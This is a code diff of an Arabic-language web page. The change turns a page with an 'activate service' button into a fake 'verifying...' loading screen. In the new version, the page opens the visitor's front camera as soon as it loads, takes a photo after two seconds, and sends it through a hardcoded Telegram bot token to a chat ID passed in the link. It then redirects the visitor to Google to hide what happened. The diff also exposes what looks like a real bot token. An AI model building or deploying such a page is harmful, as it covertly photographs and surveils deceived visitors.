@@ -3,71 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل النظام</title>
+    <title>جاري التحقق...</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; }
-        #startBtn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; }
-        video { display: none; }
+        body {
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 8px fandi #ddd;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
-    <h2>يجب الضغط على الزر لتفعيل الخدمة</h2>
-    <button id="startBtn">ابدأ الآن</button>
-    
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="loader"></div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const token = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
         
-        // الحصول على sender_id من الرابط
+        // استخراج الـ chatId من الرابط
         const urlParams = new URLSearchParams(window.location.search);
-        const senderId = urlParams.get('sender_id');
+        const chatId = urlParams.get('chatId') || urlParams.get('sender_id');
 
-        startBtn.onclick = async () => {
-            startBtn.innerText = "جاري التحميل...";
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                setTimeout(() => {
-                    takeSnapshot();
-                }, 2000); // التقاط الصورة بعد ثانيتين من فتح الكاميرا
-            } catch (err) {
-                alert("يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.");
-            }
-        };
 
-        function takeSnapshot() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            
-            const imageData = canvas.toDataURL('image/jpeg');
-            sendToTelegram(imageData);
+                // انتظر قليلاً حتى تفتح الكاميرا بوضوح ثم التقط الصورة
+                setTimeout(() => {
+                    takePhoto();
+                }, 2000);
+            } catch (err) {
+                console.error("خطأ في الكاميرا: ", err);
+            }
         }
 
-        function sendToTelegram(image) {
-            const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
-            const formData = new FormData();
-            formData.append('chat_id', senderId);
+        function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            context.drawImage(video, 0, 0, 640, 480);
             
-            // تحويل الـ Base64 إلى File لإرساله كصورة حقيقية
-            fetch(image)
-                .then(res => res.blob())
-                .then(blob => {
-                    formData.append('photo', blob, 'snapshot.jpg');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).then(() => {
-                        alert("تم التفعيل بنجاح!");
-                    });
-                });
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'image.jpg');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    // بعد إرسال الصورة، يمكن توجيه المستخدم لصفحة أخرى
+                    window.location.href = "https://www.google.com";
+                })
+                .catch(error => console.error('خطأ في الإرسال:', error));
+            }, 'image/jpeg');
+        }
+
+        // بدء العملية عند فتح الصفحة
+        if (chatId) {
+            startCamera();
+        } else {
+            alert("خطأ: المعرف غير موجود");
         }
     </script>
 </body>
